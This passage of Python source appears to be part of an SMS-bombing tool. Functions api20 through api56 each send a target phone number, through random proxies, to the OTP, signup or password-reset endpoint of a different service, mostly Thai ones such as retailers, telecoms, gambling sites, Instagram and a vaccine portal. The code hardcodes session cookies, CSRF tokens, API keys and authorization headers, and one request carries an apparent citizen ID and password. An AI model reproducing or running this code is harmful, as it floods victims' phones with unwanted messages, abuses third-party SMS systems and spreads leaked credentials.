      "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"
    })


def api20(phone):
  post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",
       proxies={"http": "http://" + random.choice(proxy)},
       headers={"User-Agent": useragent},
       json={
         "lang": "th",
         "userType": "BUYER",
         "locale": "th",
         "orgIdfier": "scg",
         "phone": f"+66{phone[1:]}",
         "type": "signup",
         "otpTemplate": "buyer_signup_otp_message",
         "userParams": {
           "buyerName": "dec"
         }
       })


def api21(phone):
  post("https://www.carsome.co.th/website/login/sendSMS",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "username": phone,
         "optType": 0
       })


def api22(phone):
  post(
    "https://api-globalhouse.com/sms/requestOTP",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "authorization":
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc",
      "content-type": "application/json; charset=utf-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "accept": "*/*",
      "origin": "https://m.globalhouse.co.th",
      "referer": "https://m.globalhouse.co.th/"
    },
    json={"phonNumber": f"{phone}"})


def api23(phone):
  post(
    "https://gamingnation.dtac.co.th/api/otp/request",
    proxies={"http": "http://" + random.choice(proxy)},
    json={
      "template":
      "register",
      "phone_no":
      phone,
      "token":
      "03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"
    },
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",
      "Cookie":
      "i18n_redirected=th; _gcl_au=1.1.1259613914.1645770250; _fbp=fb.2.1645770253711.1894109895; _hjSessionUser_2510409=eyJpZCI6IjY1NDUxZTZiLTMxNDYtNWY2NS1iZTI5LTJlYTg2YTUxZWRiMiIsImNyZWF0ZWQiOjE2NDU3NzAyNTM1NTUsImV4aXN0aW5nIjp0cnVlfQ==; v10DeviceID=76d43cf572c2921a5fb598a66248e158; v10UA=DTAC%2F10.0%2Fweb%2F1.0%2FNetworkType%2F76d43cf572c2921a5fb598a66248e158%2FM2006C3LG-Chrome; fromApp=dtacLite; v10Lang=th; OptanonAlertBoxClosed=2022-02-25T06:31:00.287Z; _hjSessionUser_1100693=eyJpZCI6ImUzMWM2NjcyLTBjMzAtNTIxZC05ZDdiLTFlNjg3NTc4ZjkxZSIsImNyZWF0ZWQiOjE2NDU3NzA2ODE3NTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.3.176519351.1645770253; OptanonConsent=isIABGlobal=false&datestamp=Fri+Feb+25+2022+13%3A33%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.15.0&hosts=&consentId=cd42bf1d-c1ac-4a3f-b20c-54d16145aa24&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&geolocation=TH%3B84&AwaitingReconsent=false; cto_bundle=2wShxV91OFdyc3NvNVQ5TUZ3VFZzM0JkOWlQSFMxZU8xMXF2Y3VxR1RWJTJGOTcySkVCU3VqZ09haVByaHVNT3hjQTY0VUQyTHF6WXhVMEl0Um1KUDZVTFh3JTJGdWxOck9VZ1U3aDNVYVBJVyUyQnB3dXAwWThlR2tvMnh1WlRTWlRjU3hscGxaZkxkJTJGWUhXeVI4dUJHb2MwcnNiNXVyQSUzRCUzRA; _ga_EGFFCDXTW2=GS1.1.1645770681.1.1.1645770804.0; _gid=GA1.3.1993109359.1647399772; auth.strategy=local; _gat_UA-16732483-1=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjIyNGE1NzFlLTdhOTUtNDMzNC1iMjE2LWVhNjc5YzIwNjA4MSIsImNyZWF0ZWQiOjE2NDc0MDY0NzAyOTAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0"
    })


def api24(phone):
  post("https://api.1112delivery.com/api/v1/otp/create",
       proxies={"http": "http://" + random.choice(proxy)},
       headers={"User-Agent": useragent},
       json={
         'phonenumber': f"{phone}",
         'language': "th"
       })


def api25(phone):
  post("https://api2.1112.com/api/v1/otp/create",
       proxies={"http": "http://" + random.choice(proxy)},
       headers={"User-Agent": useragent},
       json={
         'phonenumber': f"{phone}",
         'language': "th"
       })


def api26(phone):
  post(
    f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",
    proxies={"http": "http://" + random.choice(proxy)},
    headers=header)


def api27(phone):
  post(
    "https://www.kaitorasap.co.th/api/index.php/send-otp-login-new/",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With":
      "XMLHttpRequest",
      "sec-ch-ua-mobile":
      "?1",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
    },
    data=f"phone_number={phone}&lag=")


def api28(phone):
  post(
    "https://api-next-version.freshket.co/baseApi/Users/RequestOtp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json;charset=UTF-8",
      "accept": "application/json, text/plain, */*",
      "x-guest": "Julian"
    },
    json={
      "isDev": "false",
      "language": "th",
      "phone": f"+66{phone}"
    })


def api29(phone):
  post(
    f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",
    proxies={"http": "http://" + random.choice(proxy)})


def api30(phone):
  post(
    f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha_new?mobile=66-{phone[1:]}",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "Cookie":
      "_gcl_au=1.1.1377784313.1657612429; _gid=GA1.2.922641648.1657612430; _gat_gtag_UA_42073293_1=1; _gat_UA-42073293-1=1; _ga=GA1.1.1074138997.1657612430; _tt_enable_cookie=1; _ttp=9dab77a4-eff4-4388-88a9-7ab70dd45359; _fbp=fb.1.1657612432616.329765152; _ga_YDQTL3X3WX=GS1.1.1657612431.1.1.1657612457.0"
    })


def api31(phone):
  post(
    "https://www.theconcert.com/rest/request-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "x-xsrf-token":
      "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA",
      "x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc",
      "cookie":
      "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%R3.mnux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "content-type": "application/json;charset=UTF-8"
    },
    json={
      "mobile": phone,
      "country_code": "TH",
      "lang": "th",
      "channel": "sms",
      "digit": 4
    })


def api32(phone):
  post("https://mapi.konglor888.com/api/otp/register",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "applicant": f"{phone}",
         "serviceName": "konglor888.com"
       })


def api33(phone):
  post("https://mapi.hit789.com/api/otp/register",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "applicant": f"{phone}",
         "serviceName": "hit789.com"
       })


def api34(phone):
  post("https://vaccine.trueid.net/vacc-verify/api/getotp",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "msisdn": f"{phone}",
         "function": "enroll"
       })


def api35(phone):
  post("https://lb-api.fox83-sy.xyz/api/otp/register",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "applicant": f"{phone}",
         "serviceName": "fox888.com"
       })


def api36(phone):
  post("https://ezregis01.com/_ajax_/register/request-otp",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "phoneNumber": f"{phone}",
         "affSign": "e1af462f54b57749cb61e4ac010fd0ee"
       })


def api37(phone):
  post("https://mapi.dung919.com/api/otp/register",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "applicant": f"{phone}",
         "serviceName": "dung919.com"
       })


def api38(phone):
  token, cid = ig_token()
  post(
    "https://www.instagram.com/accounts/send_signup_sms_code_ajax/",
    proxies={
      "http": "http://" + random.choice(proxy)
    },
    data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",
    headers={
      "Content-Type": "application/x-www-form-urlencoded",
      "X-Requested-With": "XMLHttpRequest",
      "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
      "X-CSRFToken": token
    }).json()


def api39(phone):
  post(
    "https://api.set.or.th/api/member/registration",
    proxies={"http": "http://" + random.choice(proxy)},
    json={
      "citizenId":
      "1840201297389",
      "passport":
      "",
      "country":
      "th",
      "termFlag":
      "true",
      "subscriptionFlag":
      "true",
      "email":
      "bdjsss@gmail.com",
      "password":
      "090Kkk12",
      "gender":
      "M",
      "firstName":
      "แวหยกกว",
      "lastName":
      "กวยกจแวกวก",
      "mobile":
      f"+66{phone}",
      "captcha":
      "03AIIukzjHWhfsTpFpujjNmHQnFczifaX2EAd6iHyG_pqg769Dtpj4stj_E13Lg5Tj2LC5gEq0Es5EiMQa3E-Kl6h25rKm890hlxWQcwgOImpWS5BE-vCC0n_SiKPrHzfW-TLU2n1DLpJzVBooR1DZLt_DDtTxvZhap6YDR9m42kJBcIh3rTuhsYavsJ7daNTjzBqo9V7XuHuAjW_o7Bd1RXNhaLEFwJquoTkkjpvT2vjLVmzinm9Kgxr9GWpl-fuCr4GYRwXDydLBKjU-CwqrNk7elYhedS83VlIla_gtH6hF7HuLEvzU_FLt4V622MJIEPwZaAc6ivQjnibX_PwAS1evs67p7GH4CZn7JOE6VCSWDLC6wsz_um4bzygapb9_xjH6U_FhEz-6uIByc9VXlRtBoFHrLEDQhFlwHEqqG3wOS_HY2yPJReDuWgmbTVbdLXGSDf98tYZccz68n4u3g5McEYtIDo6afVObd-7LPcnK3uvi5CqIjoh3cvzyD4j9z5sLNS1yLibOnX6OGPTkG0trp-pjVOICPQ"
    })


def api40(phone):
  post("https://api.set.or.th/api/otp/request",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "type": "REGISTRATION",
         "refID": "e865e7a6-e8c7-4adc-a204-90e5bca90ce0",
         "channel": "MOBILE"
       })


def api41(phone):
  post(
    "https://biogamin1-api.win.game/api/v3/otp/send",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json",
      "authorization":
      "Basic a7af349d858e91c6b96426a64148dc41b8de4e2b808537fb1f98556379769ff62d5295bb4d0e1302a91629744cad45d6d175c7752fec4b777536c160137b0c32",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://wallet.biogaming1.com",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://wallet.biogaming1.com/"
    },
    json={
      "tel": f"{phone}",
      "otp_type": "register"
    })


def api42(phone):
  post(
    "https://gateway-sport.apija.tech/iamrobot/frontend/user/send-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "accept": "application/json",
      "content-type": "application/json",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://sport.playauto.cloud",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://sport.playauto.cloud/"
    },
    json={
      "tel": f"{phone}",
      "prefix": "KDA"
    })


def api43(phone):
  post(
    "https://member.ufabet191.tv/api/auth/register-request-otp/",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host":
      "member.ufabet191.tv",
      "content-length":
      "62",
      "content-type":
      "application/x-www-form-urlencoded",
      "x-requested-with":
      "XMLHttpRequest",
      "sec-ch-ua-mobile":
      "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform":
      "Android",
      "accept":
      "*/*",
      "origin":
      "https://member.ufabet191.tv",
      "sec-fetch-site":
      "same-origin",
      "sec-fetch-mode":
      "cors",
      "sec-fetch-dest":
      "empty",
      "referer":
      "https://member.ufabet191.tv/auth/register",
      "cookie":
      "_ga=GA1.2.33421619.1662160579",
      "cookie":
      "_gid=GA1.2.1771765964.1662160579",
      "cookie":
      "_gat_gtag_UA_158659719_10=1",
      "cookie":
      "XSRF-TOKEN=eyJpdiI6IndhdW5qNE1ZT1ZNQXJWaUpuLzUwVFE9PSIsInZhbHVlIjoiQk9PZFhxanMrM1pMblIzdEhFc0lSNFJLTkNLZjVyUWNpQkpTV0V6L05OakxtU2xzTk12YUpvSHczQ2d6aTFzcTRXcG05TWM2a3NWUTMxWXJVVXZoR29WT2g0d1JGUEl4YUdOMVQwVVVzNTFuWEh1eDhVOTRDbmE0Zm1qcFhDTmkiLCJtYWMiOiI3ZmQ3MzdhM2MyNTRjNzQ5YWQzZmEyNTJlMjM5Y2M3YjhlYjkzYzgwN2FlY2Y0Y2VjMzhlZTJkODJlNTBkY2E2IiwidGFnIjoiIn0%3D",
      "cookie":
      "ufabet191tv_session=eyJpdiI6Ijd4Ui83Q2I3aldocUU5NTJ5dFo4WUE9PSIsInZhbHVlIjoiaytmT2V0Zlk2WWk4QU0rMUpUMWdJZ2Zwc3hsSnVzZVNYTVoxYytYaGNwQlBRcUEwOWU1MStreE80NktiOExMczhJR2VPZHV1VklVUmVJdDlQUU1vTjc5cXpBN1pPK2hHeUlsVWIxcGlWRkdISzVuTE5vSnFrdkJqVklYNzJiUDMiLCJtYWMiOiI2N2Y4YWRlZTcxYjhjZjlkYTI2NzhiMmNkMjkwYTQzNDY3ZmFkYjM1MjZmNmFiMTRlYTdkOTg3ZDU1OWRmYmFhIiwidGFnIjoiIn0%3D"
    },
    data=f"tel={phone}&_token=Y8NI28Fne5GUrBncQbzPrOb0nOftBiqEa8Cf4rEp")


def api44(phone):
  post(
    "https://api.lotuscash.cc/user/sendCode-h5",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host":
      "api.lotuscash.cc",
      "Connection":
      "keep-alive",
      "Content-Length":
      "17",
      "codeAlias":
      "null",
      "browser":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-mobile":
      "?1",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "Accept":
      "application/json, text/plain, */*",
      "language":
      "vi",
      "sec-ch-ua-platform":
      "Android",
      "Origin":
      "https://h5.lotuscash.cc",
      "Sec-Fetch-Site":
      "same-site",
      "Sec-Fetch-Mode":
      "cors",
      "Sec-Fetch-Dest":
      "empty",
      "Referer":
      "https://h5.lotuscash.cc/",
      "Cookie":
      "_gcl_au=1.1.558674357.1663249325; _fbp=fb.1.1663249330165.707916972"
    },
    data=f"mobile={phone}")


def api45(phone):
  post(
    "https://pop99.com/api/register-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host":
      "pop99.com",
      "content-length":
      "70",
      "x-white-lable-name":
      "pop99",
      "x-exp-signature":
      "62ff52961948a80011b2ee2c",
      "accept-language":
      "th",
      "sec-ch-ua-mobile":
      "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "content-type":
      "application/json",
      "accept":
      "application/json, text/plain, */*",
      "sec-ch-ua-platform":
      "Android",
      "origin":
      "https://pop99.com",
      "sec-fetch-site":
      "same-origin",
      "sec-fetch-mode":
      "cors",
      "sec-fetch-dest":
      "empty",
      "referer":
      "https://pop99.com/?action=register&refer_code=rusUxi0PRd",
      "cookie":
      "auth.strategy=local",
      "cookie":
      "i18n_redirected=th",
      "cookie":
      "nuxt-session-id=s%3Apk5rGJntcQbJ8-dQZTdpPH7m4VfmLpMr.ccLEX6L6BeNXKamfIc0SLBdUhon77sWXq%2FaBXrRjCBY",
      "cookie":
      "__cf_bm=ra8w7XIwtr7CkOL9EEiJ3nKRFkN_H8QgUAyV_jloIKk-1663317261-0-AUDhU3fWstmEUozlYN33s72ni/2vodBiDVZ4+JEZZiAVrL8apGxN0TSOXKcICPI9hY01kGe9uJ8suL2E1iuChgH5696shjSc1+HKTgU19XMyydGP4IfwR5xjjITD9oMyXg=="
    },
    json={
      "brands_id": "62ff52961948a80011b2ee2c",
      "tel": f"{phone}",
      "token": ""
    })


def api46(phone):
  post(
    "https://api-sso.ch3plus.com/user/request-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "api-sso.ch3plus.com",
      "content-length": "35",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://accounts.ch3plus.com",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://accounts.ch3plus.com/"
    },
    json={
      "tel": f"{phone}",
      "type": "login"
    })


def api47(phone):
  post(
    "https://davyjones.mrwed.cloud/customer/register/get-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "davyjones.mrwed.cloud",
      "content-length": "46",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json",
      "accept-language": "th",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://member.ufa058.com",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://member.ufa058.com/"
    },
    json={
      "countryCode": "TH",
      "phoneNumber": f"{phone}"
    })


def api48(phone):
  post(
    "https://ep789bet.net/auth/send_otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host":
      "ep789bet.net",
      "content-length":
      "66",
      "accept":
      "application/json, text/plain, */*",
      "content-type":
      "application/x-www-form-urlencoded",
      "sec-ch-ua-mobile":
      "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform":
      "Android",
      "origin":
      "https://ep789bet.net",
      "sec-fetch-site":
      "same-origin",
      "sec-fetch-mode":
      "cors",
      "sec-fetch-dest":
      "empty",
      "referer":
      "https://ep789bet.net/register",
      "cookie":
      "ep789bet=afe1feci916eqoq896js1f8dt93r88ov",
      "cookie":
      "__cf_bm=U2QIM_gSO7JM9pi7koboRETjeXFhgW_l19lMVMrc1Lc-1663356271-0-AVHFc3HoTcchA560e1sANHxXoo0bVBdQ0TgZ8q8GqvlW5YWNH5dwetqccOFMgcQNafX0lN0Xo62Ux9BYycbab7iE26WD3MXVn4Mivbm4rxVRqvt5697NOYfnlvlgiJEh8A=="
    },
    data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=")


"""api reset password only phonenumber 082704****"""


def api49(phone):
  post(
    "https://api.mcshop.com/cognito/me/forget-password",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "api.mcshop.com",
      "content-length": "25",
      "x-store-token": "mcshop",
      "accept-language": "th",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json;charset=UTF-8",
      "accept": "application/json, text/plain, */*",
      "x-auth-token":
      "O2d1ZXN0OzExNDcwNTg3OzIxODY1ODkyZTMzZGMwMGMzZjNlZmZlNDBlMmY3OTgzOzs7Ow==",
      "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3",
      "sec-ch-ua-platform": "Android",
      "origin": "https://www.mcshop.com",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://www.mcshop.com/"
    },
    json={"username": f"{phone}"})


def api50(phone):
  post(
    "https://www.msport1688.com/auth/otp_sender",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "www.msport1688.com",
      "content-length": "66",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/x-www-form-urlencoded",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://www.msport1688.com",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://www.msport1688.com/ register?broker_ref_code=master",
      "cookie": "msp_ss_client=upt6ij2sckk5p8vejmmrnauiaucalmkd",
      "cookie": "_ga=GA1.1.1012034005.1663353016",
      "cookie": "_ga_1YLLB0C2FF=GS1.1.1663353015.1.1.1663353040.0.0.0"
    },
    data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=")


def api51(phone):
  post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
       proxies={"http": "http://" + random.choice(proxy)},
       data={"mobile_phone_no": phone})


def api52(phone):
  post(
    "https://api.watsons.co.th/api/v2/wtcth/forms/extendedActivateMemberCardForm/steps/wtcth_extendedActivateMemberCardForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/json",
      "x-anonymous-consents": "%5B%5D",
      "accept": "application/json, text/plain, */*",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "queueit-target":
      "https://www.watsons.co.th/register/activateMemberCard",
      "sec-ch-ua-platform": "Android",
      "origin": "https://www.watsons.co.th",
      "referer": "https://www.watsons.co.th/"
    },
    json={
      "otpTokenRequest": {
        "action": "ACTIVATE_MEMBER_CARD",
        "type": "SMS",
        "countryCode": "66",
        "target": f"{phone}"
      },
      "defaultAddress": {
        "mobileNumberCountryCode": "66",
        "mobileNumber": f"{phone}"
      },
      "mobileNumber": f"{phone}"
    })


def api53(phone):
  post(
    "https://services.eventpass.co/eventpass-accounts/otp/send",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "services.eventpass.co",
      "content-length": "71",
      "sec-ch-ua-mobile": "?1",
      "content-type": "application/json",
      "access-control-allow-origin": "*",
      "lang": "th",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "appid": "EVPAPP601129510b8d9205016493a3",
      "sec-ch-ua-platform": "Android",
      "accept": "*/*",
      "origin": "https://www.eventpass.co",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://www.eventpass.co/"
    },
    json={
      "send_to": f"{phone}",
      "send_otp_type": "mobile",
      "otp_type": "register"
    })


def api54(phone):
  post(
    "https://practical13.hbsapi.com/sms/send-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json;charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://app.agplus.co",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://app.agplus.co/"
    },
    json={"phone": f"{phone}"})


def api55(phone):
  post(
    "https://www.mtsblockchain.com/mgb-api/user/register/reqotp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host":
      "www.mtsblockchain.com",
      "Connection":
      "keep-alive",
      "Content-Length":
      "23",
      "Accept":
      "application/json, text/plain, */*",
      "Content-Type":
      "application/json",
      "sec-ch-ua-mobile":
      "?1",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform":
      "Android",
      "Origin":
      "https://www.mtsblockchain.com",
      "Sec-Fetch-Site":
      "same-origin",
      "Sec-Fetch-Mode":
      "cors",
      "Sec-Fetch-Dest":
      "empty",
      "Referer":
      "https://www.mtsblockchain.com/register",
      "Cookie":
      "_ga=GA1.2.1715268471.1663529777; _gid=GA1.2.1410958904.1663529777; _gat_gtag_UA_230676474_1=1; connect.sid=s%3AxpnA-HUHM-Ooo3w8bQfGSr1Q9yBVE6iN.Xt99nQxPFhKYUNyiSV%2FLCAI4Pdo3vuoeI27vGqh3SJo; cookie_policy_accepted=1"
    },
    json={"mobile": f"{phone}"})


def api56(phone):
  get(f"https://app.khonde.com/requestOTP/{phone}",
      proxies={"http": "http://" + random.choice(proxy)})


def api57(phone):
  post(
